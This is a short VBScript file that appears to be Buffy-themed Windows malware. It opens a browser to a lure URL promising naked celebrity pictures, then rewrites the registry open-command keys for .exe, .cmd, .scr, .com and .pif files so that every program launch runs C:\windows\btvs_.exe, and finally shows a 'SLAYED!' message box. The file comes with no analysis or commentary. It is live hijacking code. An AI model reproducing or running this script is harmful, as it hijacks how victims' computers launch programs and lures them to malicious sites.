On Error Resume Next
shell.Run """C:\Program Files\Internet Explorer\IExplore.exe""http://buffy-the-buffie-naked.smithalannews.cn/index.html"
shell.Run """C:\Program\Internet Explorer\IExplore.exe""http://buffy-the-buffie-naked.smithalannews.cn/index.html"
Set btvs = CreateObject("WScript.Shell")
smg="C:\windows\btvs_.exe @%1@": smg=replace(smg,"@",chr(34))
btvs.RegWrite "HKEY_CLASSES_ROOT\cmdfile\shell\open\command\",smg
btvs.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",smg
btvs.RegWrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\",smg
btvs.RegWrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\",smg
btvs.RegWrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\",smg
dim spike
spike = MsgBox("SLAYED!",vbAbort+vbInformation,"Buffy says:")